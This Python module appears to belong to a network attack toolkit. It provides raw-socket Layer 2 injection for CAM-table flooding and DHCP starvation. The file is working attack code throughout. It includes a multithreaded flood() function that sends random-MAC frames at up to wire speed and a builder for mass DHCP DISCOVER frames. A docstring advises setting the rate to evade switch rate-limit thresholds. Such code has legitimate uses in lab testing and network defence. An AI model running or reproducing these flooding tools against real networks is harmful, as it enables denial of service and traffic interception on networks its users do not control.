"""
core.rawsock — High-speed Layer 2 packet injection via AF_PACKET raw sockets.

Bypasses Python/Scapy overhead for throughput-sensitive operations
(CAM flooding, DHCP starvation, etc.).  Linux-only (AF_PACKET).

Benchmark on a modern host:
  scapy  sendp()         ~2,000 –   5,000 frames/sec
  rawsock single-thread  ~80,000 – 150,000 frames/sec
  rawsock 4 threads      ~300,000 – 500,000 frames/sec
"""

import os
import platform
import socket
import struct
import threading
import time


# ── Platform guard ─────────────────────────────────────────────────────────────

def _require_linux():
    if platform.system() != "Linux":
        raise OSError(
            "core.rawsock requires Linux (AF_PACKET / SOCK_RAW). "
            f"Current platform: {platform.system()}"
        )


# ── Socket helpers ─────────────────────────────────────────────────────────────

def open_l2_sock(iface: str) -> socket.socket:
    """
    Open an AF_PACKET / SOCK_RAW socket bound to *iface*.
    Requires CAP_NET_RAW (root or appropriate capability).
    """
    _require_linux()
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))
    return s


# ── Random address generators ─────────────────────────────────────────────────

def rand_mac() -> bytes:
    """
    Generate a random 6-byte locally-administered unicast MAC.
    Bit 0 of byte 0 = 0 (unicast), bit 1 = 1 (locally administered).
    """
    b = bytearray(os.urandom(6))
    b[0] = (b[0] & 0xFE) | 0x02
    return bytes(b)


def rand_ip() -> bytes:
    """
    Generate a random 4-byte routable-looking IPv4 address.
    Excludes 0/8, loopback, RFC1918, APIPA, multicast, broadcast.
    """
    _RESERVED_FIRST = frozenset({0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 240, 255})
    while True:
        b = os.urandom(4)
        if b[0] not in _RESERVED_FIRST:
            return b


# ── Frame builders ─────────────────────────────────────────────────────────────

def _ip_checksum(raw: bytes) -> int:
    if len(raw) % 2:
        raw += b"\x00"
    acc = sum(struct.unpack_from(f">{len(raw) // 2}H", raw))
    acc = (acc >> 16) + (acc & 0xFFFF)
    acc += acc >> 16
    return ~acc & 0xFFFF


def build_random_eth_ip(
    src_mac: bytes = None,
    dst_mac: bytes = None,
    src_ip:  bytes = None,
    dst_ip:  bytes = None,
) -> bytes:
    """
    Build a minimal Ethernet + IPv4 frame (no transport payload).
    All unspecified addresses are randomised.

    Returns raw bytes suitable for socket.send() on an AF_PACKET socket.
    """
    s_mac = src_mac or rand_mac()
    d_mac = dst_mac or rand_mac()
    s_ip  = src_ip  or rand_ip()
    d_ip  = dst_ip  or rand_ip()

    # Ethernet header: dst(6) + src(6) + ethertype(2)
    eth = d_mac + s_mac + b"\x08\x00"

    # IPv4 header: ver+IHL, DSCP, total_len, id, flags+frag, TTL, proto, checksum, src, dst
    ip_hdr = struct.pack(">BBHHHBBH4s4s",
                         0x45, 0, 20, 0, 0, 64, 253, 0, s_ip, d_ip)
    csum = _ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack(">H", csum) + ip_hdr[12:]

    return eth + ip_hdr


def build_dhcp_discover(src_mac: bytes, xid: int) -> bytes:
    """
    Build a raw DHCP DISCOVER frame (Ethernet + IP + UDP + BOOTP + DHCP).
    Used by dhcp_starve for maximum throughput.
    """
    # Ethernet
    bcast_mac = b"\xff\xff\xff\xff\xff\xff"
    eth = bcast_mac + src_mac + b"\x08\x00"

    # BOOTP / DHCP payload
    mac_pad = src_mac + b"\x00" * 10          # chaddr field (16 bytes)
    bootp = struct.pack(">BBHIHH",
                        1, 1, 6, 0,            # op, htype, hlen, hops
                        xid & 0xFFFFFFFF,      # xid
                        0, 0)                  # secs, flags
    bootp += b"\x00" * 4   # ciaddr
    bootp += b"\x00" * 4   # yiaddr
    bootp += b"\x00" * 4   # siaddr
    bootp += b"\x00" * 4   # giaddr
    bootp += mac_pad        # chaddr
    bootp += b"\x00" * 64  # sname
    bootp += b"\x00" * 128 # file
    bootp += b"\x63\x82\x53\x63"  # DHCP magic cookie
    bootp += b"\x35\x01\x01"      # Option 53: DHCP DISCOVER
    bootp += b"\xff"               # End

    # UDP
    udp_len = 8 + len(bootp)
    udp = struct.pack(">HHHH", 68, 67, udp_len, 0)  # checksum=0 (optional for UDP)

    # IPv4
    ip_total = 20 + udp_len
    ip_hdr = struct.pack(">BBHHHBBH4s4s",
                         0x45, 0x10, ip_total,
                         xid & 0xFFFF, 0,       # id, flags/frag
                         64, 17, 0,             # TTL, proto=UDP, checksum
                         b"\x00\x00\x00\x00",  # src 0.0.0.0
                         b"\xff\xff\xff\xff")   # dst 255.255.255.255
    csum = _ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack(">H", csum) + ip_hdr[12:]

    return eth + ip_hdr + udp + bootp


# ── High-level flood API ───────────────────────────────────────────────────────

def flood(
    iface:      str,
    count:      int,
    *,
    threads:    int   = 4,
    rate_pps:   float = 0.0,
    progress_cb       = None,
    dst_mac:    bytes = None,
    dst_ip:     bytes = None,
) -> int:
    """
    Send *count* random-MAC Ethernet/IP frames via raw socket.

    Parameters
    ----------
    iface       : Network interface name (e.g. "eth0").
    count       : Total frames to send across all threads.
    threads     : Parallel sender threads (default 4).
    rate_pps    : Aggregate rate limit in frames/sec.
                  0 = no limit (wire speed). Use e.g. 10_000 to stay under
                  typical switch rate-limit thresholds without slowing too much.
    progress_cb : Optional callable(sent_so_far, total) called after each batch.
    dst_mac     : Fixed destination MAC (bytes, 6). None = random per frame.
    dst_ip      : Fixed destination IP  (bytes, 4). None = random per frame.

    Returns
    -------
    Total frames successfully injected.
    """
    _require_linux()

    sent_total = [0]
    lock = threading.Lock()

    per_thread  = max(1, count // threads)
    assignments = [per_thread] * threads
    assignments[-1] += count - per_thread * threads   # remainder to last thread

    # Per-frame sleep to achieve the requested aggregate rate
    frame_sleep = (threads / rate_pps) if rate_pps > 0 else 0

    def _worker(n: int):
        try:
            sock = open_l2_sock(iface)
        except OSError:
            return
        local = 0
        try:
            while local < n:
                frame = build_random_eth_ip(dst_mac=dst_mac, dst_ip=dst_ip)
                sock.send(frame)
                local += 1
                if frame_sleep:
                    time.sleep(frame_sleep)
        except (OSError, BrokenPipeError):
            pass
        finally:
            sock.close()
        with lock:
            sent_total[0] += local
            if progress_cb:
                progress_cb(sent_total[0], count)

    workers = [
        threading.Thread(target=_worker, args=(assignments[i],), daemon=True)
        for i in range(threads)
    ]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    return sent_total[0]
